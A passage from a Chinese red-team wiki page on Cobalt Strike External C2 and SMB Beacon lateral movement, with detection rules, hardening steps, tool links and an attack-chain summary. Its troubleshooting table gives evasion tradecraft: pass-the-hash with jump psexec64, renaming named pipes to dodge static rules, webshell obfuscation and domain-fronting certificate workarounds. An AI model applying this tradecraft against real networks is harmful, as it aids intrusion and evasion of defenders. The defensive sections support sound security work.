| **非业务时间段 445 激增** | 防火墙/NDR | `time NOT IN business_hours AND count(445) > baseline * 3` |
| **JA3/JA3S 指纹异常** | TLS 指纹库 | `JA3S 匹配已知 Cobalt Strike 默认指纹 (未使用 Malleable Profile 时)` |
| **域前置异常** | TLS 拦截/代理日志 | `SNI 指向高信誉域名 (cdn.xxx.com) 但 HTTP Host 头不同`、`证书颁发者为云厂商 CA 但流量特征异常` |
| **HTTP 代理/隧道异常** | Web Proxy/NDR | `CONNECT 方法频繁、User-Agent 固定、目标 IP 为内网 DMZ 机器非标准端口 (822, 8080)` |

### 缓解与加固措施

1. **网络边界**：阻断 Internet 侧 TCP 445 入站/出站；内网划分 VLAN，限制工作站互访 445。
2. **主机防火墙**：启用 Windows Defender Firewall 入站规则阻止 `File and Printer Sharing (SMB-In)`，或仅允许受信管理 IP。
3. **SMB 签名/加密**：强制 SMB 签名 (`RequireSecuritySignature=1`)、启用 SMB 3.x AES-128/256 加密。
4. **禁用 SMBv1**：`Set-SmbServerConfiguration -EnableSMB1Protocol $false`。
5. **审计策略**：启用 `Audit File Share` (Event ID 5140/5145) 记录共享访问。
6. **EDR/NDR**：部署行为分析引擎识别 “进程打开大量管道”、“System 进程发起网络连接”、 **反射式加载器内存操作模式**、 **域前置 TLS 指纹异常** 等异常模式。
7. **证书透明度监控**：订阅 CT 日志，监控针对组织域名、云厂商域名签发的异常证书。
8. **Netsh 端口代理审计**：定期枚举 `netsh interface portproxy show all`，排查未授权转发规则。

---

## 实战避坑指南

| 问题 | 成因 | 规避建议 |
|------|------|----------|
| `jump psexec64` 返回 `Access Denied` | 目标未开启 `admin$` 共享、UAC 远程限制、非 Administrator 账户 | 确认 `LocalAccountTokenFilterPolicy=1`、使用 `pth` 传递 Hash、尝试 `jump winrm64`/`jump wmi` 备选 |
| 管道名被静态规则命中 | 默认 `msagent_*` 特征明显 | Malleable Profile 设置 `stage.pipe_name "legit_pipe_"`；或使用 External C2 自定义管道命名算法 |
| 子 Beacon 长时间无响应 | 父 Beacon 掉线、管道阻塞、AV 杀样本 | 设置 `stage.sleep_time` 抖动；父 Beacon 多通道冗余 (HTTP+SMB)；样本免杀 |
| `unlink` 后无法 `link` 恢复 | 子 Beacon 进程退出、管道实例被销毁 | 确认子进程存活 (`ps`)、检查 `pipename` 拼写、重新 `jump` |
| Staging Server 被封锁导致上线失败 | Stage Payload 下载中断 | 使用多 Staging Server 轮询、或预置 Stage 到目标磁盘 (Stageless) |
| 多 Team Server 会话不同步 | 客户端版本不一致、共享目录权限问题 | 统一 Client 版本、确保 `~/.cobaltstrike/` 读写权限、检查时钟同步 |
| **SpawnReflectiveC2 x86 兼容性问题** | **Cobalt Strike 4.0 判断进程位数缺陷，x64 目标上 x86 反射加载器可能失效** | **编译 x64 版反射加载器与 Stage DLL；或使用 WoW64 兼容模式显式指定架构；测试环境验证后再实战部署** |
| **域前置证书验证失败** | 云厂商 CDN 强制证书绑定、SNI 校验、证书透明度强制 | 使用云厂商托管证书、配置 Malleable Profile `ssl_verify` 策略、选择支持自定义证书的 CDN 服务 |
| **阿里云 C2 备案/实名限制** | 国内云服务需域名备案、实名认证、API 调用频控 | 提前完成备案、使用企业实名账号、设计低频心跳策略、备用多云厂商方案 |
| **goproxy/netsh 端口转发失效** | 防火墙拦截、IP 地址变更、端口冲突 | 使用 `netsh advfirewall` 放行、脚本化部署确保幂等、监控转发规则存活 |
| **pystinger Webshell 被查杀** | 静态特征匹配、流量行为分析 | 使用变种 Webshell、流量加密/混淆、限制访问频率与来源 IP |

---

## 相关工具与资源

| 类别 | 项目 | 说明 |
|------|------|------|
| **External C2 框架** | [Cooolis-ms](https://github.com/Rvn0xsy/Cooolis-ms) | 多协议 External C2 实现示例 |
| **External C2 SDK** | [ExternalC2](https://github.com/FortyNorthSecurity/ExternalC2) | 官方 Go/Python SDK 与规范文档 |
| **0x727 工具包** | [0x727 Aggressor Script Toolkit](https://github.com/0x727/Cobalt-Strike-Aggressor-Script) | 包含 SpawnReflectiveC2、Aliyun C2、PrintSpooler、atexec、FRP、Mimikatz、Bloodhound 等模块 |
| **管道枚举/监控** | [PipeList](https://learn.microsoft.com/en-us/sysinternals/downloads/pipelist) / [Sysmon](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon) | 微软官方工具 |
| **流量分析** | Wireshark (SMB2/3 解析) / Zeek (SMB 日志) | 网络层取证 |
| **Malleable Profile 库** | [Malleable-C2-Profiles](https://github.com/xx0hcd/Malleable-C2-Profiles) | 社区维护的流量伪装配置集合 |
| **红队基建自动化** | [RedWarden](https://github.com/mgeeky/RedWarden) / [C2Concealer](https://github.com/FortyNorthSecurity/C2Concealer) | 重定向器、CDN、证书自动化部署 |
| **反射加载器参考** | [ReflectiveDLLInjection](https://github.com/stephenfewer/ReflectiveDLLInjection) / [sRDI](https://github.com/monoxgas/sRDI) | 经典反射 DLL 注入实现 |
| **域前置实战指南** | [DomainFronting](https://github.com/vysec/DomainFronting) | 域前置技术文档与工具 |
| **代理工具** | [goproxy](https://github.com/snail007/goproxy) / [pystinger](https://github.com/whwlsfb/pystinger) | 文中实战使用的 HTTP/SOCKS 代理工具 |

---

## 小结

- **核心架构**：Cobalt Strike 采用 **B/S 架构**，Team Server 维护**任务队列**，Beacon 通过**异步/交互双模**心跳轮询；**Staging 机制**将 Payload 拆分为微小 Stager 与完整 Stage，降低落地风险；**多 Team Server 分布式模型**支撑基建隔离与角色分工（Staging / Long-haul / Post-Exploit）。
- **心跳特征**：默认通过 **HTTP Cookie** 传输高熵 Base64 加密元数据，周期性强，是核心网络指纹；可通过 Malleable Profile 深度伪装。
- **External C2** 将 C2 通信协议**解耦**，赋予红队“协议即代码”的灵活性。
- **SMB Beacon** 利用 **TCP 445 + 命名管道** 的默认放行特性，实现**内网免出站上线**，是横向移动核心手段。
- **实战核心链路**：凭据获取 → `net use`/`pth` 建立会话 → `jump psexec64 smb` 落地 → **观察 ∞∞ 标识确认 SMB 链路** → `link/unlink` 会话复用。
- **替代代理方案**：`goproxy + netsh portproxy` (HTTP 转发) 与 `pystinger` (SOCKS4 over Webshell) 解决无 Administrator 凭据或 445 不通场景下的不出网上线需求，**Stageless Payload** 是关键。
- **0x727 工具包增强**：集成 **SpawnReflectiveC2** 实现 **反射 DLL 注入 + 域前置** 的 C2 派生能力，支持 **阿里云等云厂商基础设施** 定制化反射 DLL，结合 **PrintSpooler、atexec、FRP、Mimikatz、Bloodhound** 形成完整红队工具链，显著提升 C2 基础设施隐匿性与生存周期。
- **流量融合** 应优先复用目标合法业务基础设施（云盘、协作软件、内部共享、**云厂商 CDN/网关**），降低异常流量指纹。
- **蓝队防御** 需构建 **主机基线 (Sysmon 17/18 + 反射加载器行为) + 网络基线 (Zeek/NDR + 域前置 TLS 指纹 + 代理异常检测) + 主动阻断 (防火墙/EDR/Netsh 审计)** 的纵深体系。

---

## 交叉引用索引

- [[smb-named-pipe-c2-communication]] — SMB 协议与命名管道原理、Cobalt Strike SMB Beacon 架构、Sysmon/Wireshark 检测实战
- [[0x727-cobalt-strike-aggressor-script-toolkit]] — 0x727 团队开源 Aggressor Script 工具包全功能清单、SpawnReflectiveC2、Aliyun C2、PrintSpooler、atexec、FRP、Mimikatz、Bloodhound 等模块详情
- [[mimikatz-source-code-architecture-golden-ticket-audit]] — 凭据导出与黄金票据构造，横向前的关键准备
- [[vulnhub-doubletrouble-writeup]] — 从初立足点到提权的完整渗透链路，可映射为 “Web Shell → 凭据 → SMB Beacon” 红队流程
- [[windows-syscall-internals-sysenter-kifastcallentry]] — 命名管道 API 到内核的系统调用追踪
- [[phantom-dll-hollowing-technique]] — 无文件内存注入技术，可配合 SMB Beacon 实现更隐蔽的 Payload 执行
- [[dotnet-clr-usage-log-tampering-edr-evasion]] — .NET CLR 日志篡改思路，可迁移至规避 SMB Beacon 托管代码加载痕迹
- [[vulnhub-platform-resource-index]] — VulnHub 靶场资源，适合复现横向移动与 SMB Beacon 实战
- [[pe-manual-mapping-loader-implementation]] — Reflective DLL Injection 完整实现，对应 Stage 加载核心逻辑与 SpawnReflectiveC2 底层加载器参考
- [[c2-redirectors-malleable-c2-profiles]] — C2 重定向器部署、Malleable C2 Profile 配置、域名前置与 CDN 隐匿技巧，为 SpawnReflectiveC2 Profile 编写提供最佳实践
- [[memory-scanning-tools-evasion-techniques]] — 内存扫描工具原理与 UDRL 规避实现，补充反射加载器对抗视角
- [[cobalt-strike-external-c2-smb-beacon]] — 本页面自身引用，便于知识图谱闭环

--- 

*本页面基于微信公众号文章《攻防对抗中的C2架构解析》整理，结合 Cobalt Strike 官方文档、External C2 规范、**0x727 团队微信归档文章《Cobalt Strike Aggressor Script 工具包分享》** 及实战文章《不出网主机上线方法》扩充。如有技术细节更新，欢迎 PR 修正。*

## 来源

- [0xfafu攻防实验室-202010-202112_08](../sources/0xfafu攻防实验室-202010-202112_08.md)
